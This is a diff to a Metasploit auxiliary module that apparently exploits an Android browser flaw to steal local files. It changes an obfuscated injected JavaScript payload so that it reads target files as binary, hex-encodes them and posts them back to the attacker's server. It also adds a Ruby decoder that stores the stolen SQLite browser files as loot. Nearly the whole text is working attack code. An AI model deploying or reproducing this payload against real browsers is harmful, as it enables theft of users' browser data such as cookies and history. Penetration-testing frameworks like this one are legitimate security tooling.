@@ -64,13 +64,14 @@ class Metasploit3 < Msf::Auxiliary
 
   def process_post(cli, request)
     data = JSON.parse(request.body)
+    contents = hex2bin(data['data'])
     file = File.basename(data['url'])
-    print_good "File received: #{request.body.length.to_f/1024}kb #{file}"
+    print_good "File received: #{(contents.bytesize.to_f/1000).round(2)}kb #{file}"
     loot_path = store_loot(
       file,
       'application/x-sqlite3',
       cli.peerhost,
-      data,
+      contents,
       File.basename(data['url']),
       "#{cli.peerhost.ljust(16)} Android browser file"
     )
@@ -125,8 +126,11 @@ class Metasploit3 < Msf::Auxiliary
           'var t=function(){setTimeout(function(){next(urls.shift());},1)};window.onmessage=t;'+
           'var next=(function(url){if(!url)return;try{var f = document.createElement("iframe");f.src=url;f.onload=f'+
           'unction(){f.onload=null;document.documentURI="javascript://hostname.com/%250D%250Ax=new '+
-          'XMLHttpRequest;x.open(String.fromCharCode(71,69,84),location.href);x.send();x.onload=fun'+
-          'ction(){ top.postMessage({data:x.responseText,url:location.href}, String.fromCharCode(42));'+
+          'XMLHttpRequest;x.open(String.fromCharCode(71,69,84),location.href);x.responseType=String.fromCharCode(97,'+
+          '114,114,97,121,98,117,102,102,101,114);x.send();x.onload=function(){window.onerror=alert;'+
+          'var buff = new Uint8Array(x.response);var hex = Array.prototype.map.call(buff, function(d)'+
+          '{var c = d.toString(16);return (c.length < 2) ? 0+c : c;}).join(new String); top.postMessa'+
+          'ge({data:hex,url:location.href}, String.fromCharCode(42));'+
           'parent.postMessage(1,String.fromCharCode(42));};x.onerror=function(){parent.postMessage(1,S'+
           'tring.fromCharCode(42))};";f.contentWindow.location = "";};document.body.appendChild(f);}catch(e){t();}});t();';
         brokenFrame.contentWindow.location = "";
@@ -134,6 +138,11 @@ class Metasploit3 < Msf::Auxiliary
 
       document.body.appendChild(brokenFrame);
     |
+  end
+
+  # TODO: Make this a proper Rex::Text function
+  def hex2bin(hex)
+    hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join
   end
 
 end
